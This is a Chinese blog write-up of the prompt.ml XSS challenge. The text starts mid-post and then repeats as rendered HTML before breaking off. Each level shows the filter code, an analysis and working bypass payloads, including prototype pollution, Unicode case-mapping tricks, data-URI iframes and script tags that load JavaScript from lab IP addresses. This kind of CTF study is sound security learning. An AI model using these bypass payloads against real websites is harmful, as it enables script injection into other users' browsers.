redirection\n    try {\n        // pass in formURL#formDataJSON\n        // e.g. http://httpbin.org/post#{\"name\":\"Matt\"}\n        var segments = input.split('#');\n        var formURL = segments[0];\n        var formData = JSON.parse(segments[1]);\n\n        var form = document.createElement('form');\n        form.action = formURL;\n        form.method = 'post';\n\n        for (var i in formData) {\n            var input = form.appendChild(document.createElement('input'));\n            input.name = i;\n            input.setAttribute('value', formData[i]);\n        }\n\n        return form.outerHTML + '                         \\n\\\n    <script>                                                  \\n\\\n        // forbid javascript: or vbscript: and data: stuff    \\n\\\n        if (!/script:|data:/i.test(document.forms[0].action)) \\n\\\n            document.forms[0].submit();                       \\n\\\n        else                                                  \\n\\\n            document.write(\"Action forbidden.\")               \\n\\\n    </script>                                                 \\n\\\n        ';\n    } catch (e) {\n        return 'Invalid form data.';\n    }\n} \n```\n\n## 分析:\n\n```\n以http://httpbin.org/post#{\"name\":\"Matt\"}为例\n用#分成两部分http://httpbin.org/post和{\"name\":\"Matt\"}\n将http://httpbin.org/post放入表单的action\n{\"name\":\"Matt\"}的name放入input的name属性,value=Matt\n如下：\n<form action=\"http://httpbin.org/post\" method=\"post\"><input name=\"name\" value=\"Matt\"></form>\n之后检查http://httpbin.org/post中是否有script:或者data:\n检查到就报错,没有就提交,目的是禁止使用类似下面的javascript，vbscript和data\njavascript:alert(1)//\nvbscript:alert(1);\ndata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\n```\n\n这一课比较抽象,看下答案`javascript:prompt(1)#{\"action\":1}`后做了下实验,通过将input中的name属性设action,能将\n\nform表单中的action替换成input的。因为input的action为[object HTMLInputElement],所以\n\nif (!/script:|data:/i.test(document.forms[0].action))就匹配不到,返回False后经过！为真,成功绕过。\n\n![6_1](/img/xss/prompt_ml/level6_001.png)\n\n![6_2](/img/xss/prompt_ml/level6_002.png)\n\n## Solutions:\n\n```\n1.javascript:prompt(1)#{\"action\":1}\n\n```\n\n## Img:\n\n1. `javascript:prompt(1)#{\"action\":1}`\n\t![6_3](/img/xss/prompt_ml/level6_003.png)\n\n# Level 7\n\n## Code:\n\n```\nfunction escape(input) {\n    // pass in something like dog#cat#bird#mouse...\n    var segments = input.split('#');\n    return segments.map(function(title) {\n        // title can only contain 12 characters\n        return '<p class=\"comment\" title=\"' + title.slice(0, 12) + '\"></p>';\n    }).join('\\n');\n}                 \n```\n\n## 分析:\n\n通过split将字符串分割成数组,再通过数组的map方法能创建新的数组,新数组格式加工成了\n\n`<p class=\"comment\" title=\"最长只有12字符的内容\"></p>`\n\nslice(0,12):取前12个字符。\n\n来张图体会一下\n\n![7_1](/img/xss/prompt_ml/level7_001.png)\n\n能修改的内容就是tittle处了,#来分割的新数组。\n\n可以利用多行注释来打通,注意到一段只有12个字符,要简洁。\n\n考虑到最短要使用到`<svg/onload=prompt(1)`的变形。\n\n## Solutions:\n\n1. \n`\"><svg/a='#'onload='/*#*/prompt(1)'`\n官方答案短一个字符...\n`\"><svg/a=#\"onload='/*#*/prompt(1)'`\n\n2. 利用eval函数特性执行拼接内容\n`\"><script>/*#*/a='prom'/*#*/+'pt(1)'/*#*/eval(a)/*#*/</script>`\n\n3. 利用换行\n\n```\n    \"><script>/*#*/prompt(/*#*/1)/*#*/</script>\n    1234\n```\n\n4. ``\"><script>`#${prompt(1)}#`</script>``\n\n\n## Img:\n\n1. `\"><svg/a='#'onload='/*#*/prompt(1)'`\n\n![7_2](/img/xss/prompt_ml/level7_002.png)\n\n2. `\"><script>/*#*/a='prom'/*#*/+'pt(1)'/*#*/eval(a)/*#*/</script>`\n\n![7_3](/img/xss/prompt_ml/level7_003.png)\n\n3. 1234是为了换行\n\n```\n\"><script>/*#*/prompt(/*#*/1)/*#*/</script>\n1234\n```\n\n![7_4](/img/xss/prompt_ml/level7_004.png)\n\n4. ``\"><script>`#${prompt(1)}#`</script>``\n\n![7_5](/img/xss/prompt_ml/level7_005.png)\n\n# Level 8\n\n## Code:\n\n```\nfunction escape(input) {\n    // prevent input from getting out of comment\n    // strip off line-breaks and stuff\n    input = input.replace(/[\\r\\n</\"]/g, '');\n\n    return '                                \\n\\\n    <script>                                    \\n\\\n        // console.log(\"' + input + '\");        \\n\\\n    </script> ';\n    }                    \n```\n\n## 分析:\n\n```\n过滤了换行 < /,解决这题需要绕过换行。\n官方给的答案是：\n[U+2028]prompt(1)[U+2028]-->\n这里很多人的都没成功，我在firefox下也没成功,不过chrome是可以的。\nprompt(1)-->\n```\n[U+2028]特殊字符在这复制：https://unicode-table.com/en/#2028\n\n<html><b>&#8232;prompt(1)&#8232;&#x2d;&#x2d;></b></html>\n\n![8_1](/img/xss/prompt_ml/level8_001.png)\n\n## Solutions:\n\n仅对chrome有用,firefox不行\n<html><b>&#8232;prompt(1)&#8232;&#x2d;&#x2d;></b></html>\n\n## Img:\n\n1.  \n![8_2](/img/xss/prompt_ml/level8_002.png)\n\n# Level 9\n\n## Code:\n\n```\nfunction escape(input) {\n    // filter potential start-tags\n    input = input.replace(/<([a-zA-Z])/g, '<_$1');\n    // use all-caps for heading\n    input = input.toUpperCase();\n\n    // sample input: you shall not pass! => YOU SHALL NOT PASS!\n    return '<h1>' + input + '</h1>';\n}                           \n```\n\n## 分析:\n\n```\n将<XXX 替换成<_XXX (XXX表示任意字符)\n然后把小写转换成大写。\n可以引用外部文件,利用js的scrpit,src和域名的大小写不敏感绕过。再利用toUpperCase()的特性，它不仅转换英文字母，也转换一些Unicode字符，比如将ſ传入就可以转换为S。\n```\n\n\n\n## Solutions:\n\n```\n1. \n<ſcript src=\"http://192.168.75.132/pro.js\"></script>\n这是我本地phpstudy下的pro.js文件,内容只有prompt(1)。\n```\n\n## Img:\n\n![9_1](/img/xss/prompt_ml/level9_001.png)\n\n1. `<ſcript src=\"http://192.168.75.132/pro.js\"></script>`\n\n![9_2](/img/xss/prompt_ml/level9_002.png)\n\n\n\n# Level A\n\n## Code:\n\n```\nfunction escape(input) {\n    // (╯°□°）╯︵ ┻━┻\n    input = encodeURIComponent(input).replace(/prompt/g, 'alert');\n    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro\n    input = input.replace(/'/g, '');\n\n    // (╯°□°）╯︵ /(.□. \\）DONT FLIP ME BRO\n    return '<script>' + input + '</script> ';\n}                          \n```\n\n## 分析:\n\n```\nencodeURIComponent() 函数可把字符串作为 URI 组件进行编码。该方法不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ' ( ) 。\n而接下来又将‘消除,传如promp't\n```\n\n\n\n## Solutions:\n\n```\n1. \npromp't(1)\n```\n\n## Img:\n\n1. `promp't(1)`\n\n![A_1](/img/xss/prompt_ml/levelA_001.png)\n\n# Level B\n\n## Code:\n\n```\nfunction escape(input) {\n    // name should not contain special characters\n    var memberName = input.replace(/[[|\\s+*/\\\\<>&^:;=~!%-]/g, '');\n\n    // data to be parsed as JSON\n    var dataString = '{\"action\":\"login\",\"message\":\"Welcome back, ' + memberName + '.\"}';\n\n    // directly \"parse\" data in script context\n    return '                                \\n\\\n    <script>                                    \\n\\\n        var data = ' + dataString + ';          \\n\\\n        if (data.action === \"login\")            \\n\\\n            document.write(data.message)        \\n\\\n    </script> ';\n}                         \n\n```\n\n## 分析:\n\n```\n将以下符号消除\n[ | 空白符 + * \\ < > & ^ : ; = ~ ! % - \n```\n\n\n\n## Solutions:\n\n```\n1. 测试时发现json对象的名称相同时会取最右的值,但是这里过滤了：,有什么办法绕过呢。\n官方答案是:\"(prompt(1))in\"\nin是js的关系操作符\n这个会发生js错误，但是能执行prompt(1)\n\n同样答案也可是：\"(prompt(1))instanceof\"\n```\n\n\n\n![B_1](/img/xss/prompt_ml/levelB_001.png)\n\n## Img:\n\n1. `\"(prompt(1))in\"`\n\n   ![B_2](/img/xss/prompt_ml/levelB_002.png)\n\n2. `\"(prompt(1))instanceof\"`\n\n   ![B_3](/img/xss/prompt_ml/levelB_003.png)\n\n\n\n# Level C\n\n## Code:\n\n```\nfunction escape(input) {\n    // in Soviet Russia...\n    input = encodeURIComponent(input).replace(/'/g, '');\n    // table flips you!\n    input = input.replace(/prompt/g, 'alert');\n\n    // ノ┬─┬ノ ︵ ( \\o°o)\\\n    return '<script>' + input + '</script> ';\n}  \n```\n\n## 分析:\n\n```\nencodeURIComponent() 函数可把字符串作为 URI 组件进行编码。该方法不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ' ( ) 。\n\n这里只能利用编码了\n参考答案利用parseInt(字符串,基数)函数将字符串转换成整数,用指定基数表示。\nparseInt(\"prompt\",36); //1558153217\n然后又用toString转化回来,用concat函数拼接编码的(1)\n参考答案:\neval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))\n \n```\n\n\n\n## Solutions:\n\n```\n1.eval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))\n\n2. 参考答案的简化版,因为没有对(1)过滤\neval((630038579).toString(30))(1)\n```\n\n\n\n\n\n## Img:\n\n1. `eval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))`\n\n![C_1](/img/xss/prompt_ml/levelC_001.png)\n\n2.  `eval((630038579).toString(30))(1)`\n\n![C_2](/img/xss/prompt_ml/levelC_002.png)\n\n\n\n# Level D\n\n## Code:\n\n```\nfunction escape(input) {\n    // extend method from Underscore library\n    // _.extend(destination, *sources) \n    function extend(obj) {\n        var source, prop;\n        for (var i = 1, length = arguments.length; i < length; i++) {\n            source = arguments[i];\n            for (prop in source) {\n                obj[prop] = source[prop];\n            }\n        }\n        return obj;\n    }\n    // a simple picture plugin\n    try {\n        // pass in something like {\"source\":\"http://sandbox.prompt.ml/PROMPT.JPG\"}\n        var data = JSON.parse(input);\n        var config = extend({\n            // default image source\n            source: 'http://placehold.it/350x150'\n        }, JSON.parse(input));\n        // forbit invalid image source\n        if (/[^\\w:\\/.]/.test(config.source)) {\n            delete config.source;\n        }\n        // purify the source by stripping off \"\n        var source = config.source.replace(/\"/g, '');\n        // insert the content using mustache-ish template\n        return '<img src=\"{{source}}\">'.replace('{{source}}', source);\n    } catch (e) {\n        return 'Invalid image data.';\n    }\n}        function escape(input) {\n    // in Soviet Russia...\n    input = encodeURIComponent(input).replace(/'/g, '');\n    // table flips you!\n    input = input.replace(/prompt/g, 'alert');\n\n    // ノ┬─┬ノ ︵ ( \\o°o)\\\n    return '<script>' + input + '</script> ';\n}  \n```\n\n## 分析:\n\n```\n//input参数是这里进入的\ntry {\n        // 举例输入的参数 {\"source\":\"http://sandbox.prompt.ml/PROMPT.JPG\"}\n        //将input字符串转换成js数据\n        var data = JSON.parse(input);\n        获得定死的source\n        var config = extend({\n            // default image source\n            source: 'http://placehold.it/350x150'\n        }, JSON.parse(input));\n        // 如果存在 字母数字下划线 / . 以外的就删除sourse \n        if (/[^\\w:\\/.]/.test(config.source)) {\n            delete config.source;\n        }\n        消除 \"\n        var source = config.source.replace(/\"/g, '');\n        // 插入sourse\n        return '<img src=\"{{source}}\">'.replace('{{source}}', source);\n    } catch (e) {\n        return 'Invalid image data.';\n    }\n}  \n```\n\n这题的绕过需要`Object.prototype.__proto__`这个属性，这个属性已经不被建议用在实际代码中。\n\n看下面的例子是如何利用的。\n\n![D_1](/img/xss/prompt_ml/levelD_001.png)\n\n当原来的值被删除时,可以用`__proto__`属性来赋值。可以构造形如\n\n`{\"source\":\"*\",\"__proto__\":{\"source\":\"\"onerror=prompt(1)>\"}}`来使原来的sources失效,而使用自己写入的来突破。\n\n但是第二次过滤的时候消除了`”`，想办法找个替代双引号的方法。\n\n这里的技巧为`String.prototype.replace()`支持特殊的`pattern`:\n\n![D_2](/img/xss/prompt_ml/levelD_002.png)\n\nreplace中使用$`会将变量的前部插入。\n\n在这里就是`<img src=\"`，借用这个虽然playad结构改变,但是绕过了`\"`\n\n## Solutions:\n\n```\n1.{\"source\":\"*\",\"__proto__\":{\"source\":\"$`onerror=prompt(1)>\"}}\n```\n\n\n\n\n\n## Img:\n\n1.\n\n```\n{\"source\":\"*\",\"__proto__\":{\"source\":\"$`onerror=prompt(1)>\"}}\n```\n\n![D_3](/img/xss/prompt_ml/levelD_003.png)\n\n# Level E\n\n## Code:\n\n```\nfunction escape(input) {\n    // I expect this one will have other solutions, so be creative :)\n    // mspaint makes all file names in all-caps :(\n    // too lazy to convert them back in lower case\n    // sample input: prompt.jpg => PROMPT.JPG\n    input = input.toUpperCase();\n    // only allows images loaded from own host or data URI scheme\n    input = input.replace(/\\/\\/|\\w+:/g, 'data:');\n    // miscellaneous filtering\n    input = input.replace(/[\\\\&+%\\s]|vbs/gi, '_');\n\n    return '<img src=\"' + input + '\">';\n}        \n```\n\n## 分析:\n\n```\n第一层：转成大写\n第二层：把// xxx:转成data(xxx表示任意字母)\n第三层：过滤了\\ & + % 空白符 和vbs\n由于转换了大写,html的标签无法使用了,这时候考虑引用外部的js文件。\n由于引用外部的js文件势必要使用到http:或http:这样的协议,所有这条路被封死了。\n考虑一下data:是否能利用。\n\n \n```\n\n![E_1](/img/xss/prompt_ml/levelE_001.png)\n\n因为经过大写转换,就只能利用base64编码的写法了。\n\n`<IFRAME/SRC=\"data:TEXT/HTML;BASE64,PHNJCMLWDD5WCM9TCHQOMSK8L3NJCMLWDD4=\">`\n\n`PHNJCMLWDD5WCM9TCHQOMSK8L3NJCMLWDD4=`是`<script>prompt(1)</script>`经过base64编码再改大写的。\n\n## Solutions:\n\n```\n1. \"><iframe/src=\"data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=\n```\n\n## Img:\n\n这题在环境下没有成功,但是在本地测试下是可行的。\n\n![E_2](/img/xss/prompt_ml/levelE_002.png)\n\n# Level F\n\n## Code:\n\n```\nfunction escape(input) {\n    // sort of spoiler of level 7\n    input = input.replace(/\\*/g, '');\n    // pass in something like dog#cat#bird#mouse...\n    var segments = input.split('#');\n\n    return segments.map(function(title, index) {\n        // title can only contain 15 characters\n        return '<p class=\"comment\" title=\"' + title.slice(0, 15) + '\" data-comment=\\'{\"id\":' + index + '}\\'></p>';\n    }).join('\\n');\n}   \n```\n\n## 分析:\n\n这一课和Level7的很类似。解决的思路是一样的,这里最大长度为15个字符,可以使用<!--多行注释。\n\n## Solutions:\n\n1. \n   `\"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>`\n   经过测试firfox下面也可以\n   `\"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</`\n\n2. \n\n``\"><script>`#${prompt(1)}#`</script>``\n\n\n3. 利用eval函数特性执行拼接内容\n\n`\"><script>/*#*/a='prom'/*#*/+'pt(1)'/*#*/eval(a)/*#*/</script>`\n\n\n## Img:\n\n1. `\"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</`\n\n![F_1](/img/xss/prompt_ml/levelF_001.png)\n\n2. ``\"><script>`#${prompt(1)}#`</script>``\n\n![F_2](/img/xss/prompt_ml/levelF_002.png)\n\n\n","slug":"prompt-xss笔记","published":1,"updated":"2019-06-19T17:23:13.384Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istns00al4dsbe3j33nq3","content":"<h1 id=\"prompt-xss笔记\"><a href=\"#prompt-xss笔记\" class=\"headerlink\" title=\"prompt-xss笔记\"></a>prompt-xss笔记</h1><p>在线xss题目,用于xss学习,弹出prompt(1)就过关.</p>\n<p>地址:<a href=\"http://prompt.ml\" target=\"_blank\" rel=\"noopener\">http://prompt.ml</a></p>\n<p>文档: <a href=\"https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml\" target=\"_blank\" rel=\"noopener\">https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml</a></p>\n<p>我使用的是firefox浏览器,不同的浏览器有时会有些差异。</p>\n<h1 id=\"Level-0\"><a href=\"#Level-0\" class=\"headerlink\" title=\"Level 0\"></a>Level 0</h1><h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight scilab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span><span class=\"params\">(input)</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">// warm up</span></span><br><span class=\"line\">    <span class=\"comment\">// script should be executed without user interaction</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;input type=\"</span>text<span class=\"string\">\" value=\"</span><span class=\"string\">' + input + '</span><span class=\"string\">\"&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><p>没有过滤,需要构造闭合。<br>官方文档的答案是<code>&quot;&gt;&lt;svg  onload=prompt(1)&gt;</code>,利用了svg标签的onload事件，<br>而onload 事件会在页面或图像加载完成后立即发生。</p>\n<h2 id=\"Solutions\"><a href=\"#Solutions\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. \"&gt;<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">prompt(1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">2. \"&gt;<span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">onload</span>=<span class=\"string\">prompt(1)</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">3. 利用外联方式 </span><br><span class=\"line\">\"&gt;<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://10.60.250.250/pro.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">4. 利用onerror事件,当src寻找的资源不存在发送错误弹框。</span><br><span class=\"line\">\"&gt;<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">'prompt(1)'</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">5. 利用html的字符实体和SVG。</span><br><span class=\"line\">    SVG意为可缩放矢量图形（Scalable Vector Graphics）。</span><br><span class=\"line\">    SVG 使用 XML 格式定义图像。</span><br><span class=\"line\">   \"&gt;<span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">prompt&amp;#x28;1&amp;#x29;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">6. 利用编码</span><br><span class=\"line\">\t\"&gt;<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"x\"</span> <span class=\"attr\">onerror</span>=<span class=\"string\">\"&amp;#x70;&amp;#x72;&amp;#x6f;&amp;#x6d;&amp;#x70;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;\"</span></span></span><br><span class=\"line\"><span class=\"tag\">&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img\"><a href=\"#Img\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><code>&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level0_001.png\" alt=\"0_1\"></p>\n<ol start=\"2\">\n<li><code>&quot;&gt;&lt;svg onload=prompt(1)&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level0_002.png\" alt=\"0_2\"></p>\n<ol start=\"3\">\n<li><code>&quot;&gt;&lt;script src=&quot;http://10.60.250.250/pro.js&quot;&gt;&lt;/script&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level0_003.png\" alt=\"0_3\"></p>\n<ol start=\"4\">\n<li><code>&quot;&gt;&lt;img src=&#39;&#39; onerror=&#39;prompt(1)&#39;&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level0_004.png\" alt=\"0_4\"></p>\n<ol start=\"5\">\n<li><code>&quot;&gt;&lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1&amp;#x29;&lt;/script&gt;&lt;/svg&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level0_005.png\" alt=\"0_5\"></p>\n<ol start=\"6\">\n<li><code>&quot;&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;&amp;#x70;&amp;#x72;&amp;#x6f;&amp;#x6d;&amp;#x70;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level0_006.png\" alt=\"0_6\"></p>\n<h1 id=\"Level-1\"><a href=\"#Level-1\" class=\"headerlink\" title=\"Level 1\"></a>Level 1</h1><h2 id=\"Code-1\"><a href=\"#Code-1\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// tags stripping mechanism from ExtJS library</span></span><br><span class=\"line\">    <span class=\"comment\">// Ext.util.Format.stripTags</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> stripTagsRE = <span class=\"regexp\">/&lt;\\/?[^&gt;]+&gt;/gi</span>;</span><br><span class=\"line\">    input = input.replace(stripTagsRE, <span class=\"string\">''</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;article&gt;'</span> + input + <span class=\"string\">'&lt;/article&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><p>过滤了<code>&lt;&gt;</code>,只要用<code>&lt;&gt;</code>闭合就将<code>&lt;xx&gt;</code>全部替换为空。</p>\n<p>可以去掉<code>&gt;</code>来绕过，浏览器在处理没有右尖括号的标签时有兼容性，没有<code>&gt;</code>的标签也能生效。（注意这时候后边不能有内容)。</p>\n<p>可以用//注释或换行分开<code>&lt;/article&gt;</code></p>\n<p>官方答案是<code>&lt;svg/onload=prompt(1)</code>,其实和<code>&lt;svg onload=prompt(1)</code>相同。</p>\n<h2 id=\"Solutions-1\"><a href=\"#Solutions-1\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> </span><br><span class=\"line\">&lt;img src=# onerror=prompt(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"number\">123</span> <span class=\"comment\">//(这里的123是为了使img生效)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span> &lt;svg/onload=prompt(<span class=\"number\">1</span>)<span class=\"comment\">// (利用注释过掉&lt;/article&gt;)</span></span><br><span class=\"line\">\t或</span><br><span class=\"line\">\t&lt;svg onload=prompt(<span class=\"number\">1</span>)<span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">3.</span> 利用onerror事件,当src寻找的资源不存在发送错误弹框。</span><br><span class=\"line\">\t&lt;img src='' onerror='prompt(<span class=\"number\">1</span>)'</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-1\"><a href=\"#Img-1\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img <span class=\"attribute\">src</span>=# <span class=\"attribute\">onerror</span>=prompt(1)</span><br><span class=\"line\">123</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level1_001.png\" alt=\"1_1\"></p>\n<ol start=\"2\">\n<li><p><code>&lt;svg/onload=prompt(1)//</code><br><img src=\"/img/xss/prompt_ml/level1_002.png\" alt=\"1_2\"></p>\n</li>\n<li><p><code>&lt;img src=&#39;&#39; onerror=&#39;prompt(1)&#39;</code>或<code>&lt;img src=&#39;&#39; onerror=&#39;prompt(1)&#39; /</code>或<code>&lt;img src=&#39;&#39; onerror=&#39;prompt(1)&#39; //</code></p>\n</li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level1_003.png\" alt=\"1_3\"></p>\n<h1 id=\"Level-2\"><a href=\"#Level-2\" class=\"headerlink\" title=\"Level 2\"></a>Level 2</h1><h2 id=\"Code-2\"><a href=\"#Code-2\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span><span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">    //                      v<span class=\"comment\">-- frowny face</span></span><br><span class=\"line\">    <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.replace(/[=(]/g, <span class=\"string\">''</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    // ok seriously, disallows equal signs <span class=\"keyword\">and</span> <span class=\"built_in\">open</span> parenthesis</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">input</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-2\"><a href=\"#分析-2\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight autohotkey\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了`=`和`)`</span><br><span class=\"line\">尝试使用编码或其他方式绕过</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Solutions-2\"><a href=\"#Solutions-2\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.使用html编码,&amp;#x28;或&amp;lpar;替代(</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">prompt&amp;#x28;1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">prompt&amp;lpar;1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">官方答案是`<span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"handlebars\"><span class=\"xml\">prompt&amp;#40;1)<span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span>`,缩短了字符。用的是&amp;#40是10进制的。</span></span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">2. 官方答案:</span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"><span class=\"built_in\">eval</span>.call<span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"string\">'prompt\\x281)'</span>&#125;</span>`</span></span></span></span><span class=\"tag\">&lt;/<span 